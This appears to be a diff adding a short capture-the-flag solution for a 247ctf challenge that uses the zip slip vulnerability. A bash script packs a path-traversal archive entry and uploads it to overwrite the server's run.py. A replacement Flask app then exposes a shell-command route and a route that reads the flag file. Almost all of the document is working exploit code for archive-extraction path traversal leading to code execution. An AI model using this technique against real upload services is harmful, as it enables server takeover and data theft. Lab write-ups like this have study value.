@@ -1,0 +1,36 @@
+the unzipping allow for a zip sip: https://snyk.io/research/zip-slip-vulnerability
+
+a.sh
+```
+#!usr/bin/env bash
+
+ENDPOINT="https://bb7f67b61264c800.247ctf.com/zip_upload"
+
+sudo cp ./a.py /app/run.py
+
+zip a.zip ../../../../../../../../app/run.py
+
+curl -X POST -Fzarchive=@a.zip "$ENDPOINT"
+```
+
+a.py
+```
+from flask import Flask
+import os, subprocess
+
+app = Flask(__name__)
+
+
+@app.route("/ls")
+def cmd():
+    return subprocess.check_output("ls", shell=True)
+
+
+@app.route("/")
+def source():
+    return "%s" % open("/app/flag_XXX.txt").read()
+
+
+if __name__ == "__main__":
+    app.run()
+```
